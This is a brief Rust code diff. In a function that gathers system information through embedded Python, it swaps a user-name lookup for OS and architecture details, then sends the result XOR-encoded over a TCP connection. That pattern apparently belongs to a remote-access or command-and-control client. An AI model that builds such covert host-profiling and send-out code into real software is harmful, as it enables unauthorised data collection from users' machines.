@@ -30,8 +30,8 @@ fn system_info(conn: &mut TcpStream, key: u8) -> PyResult<()> {
 	let py = gil.python();
 	let sys = py.import("sys")?;
 	let version: String = sys.get("version")?.extract()?;
-	let locals = [("os", py.import("os")?)].into_py_dict(py);
-	let code = "os.getenv('USER') or os.getenv('USERNAME') or 'Unknown'";
+	let locals = [("platform", py.import("platform")?)].into_py_dict(py);
+	let code = "'OS: ' + ' '.join(platform.dist()) + '\\nArchitecture: ' + ' '.join(platform.architecture())";
 	let ret: String = py.eval(code, None, Some(&locals))?.extract()?;
 	conn.write(
 		int_xor(&ret, key).as_bytes()
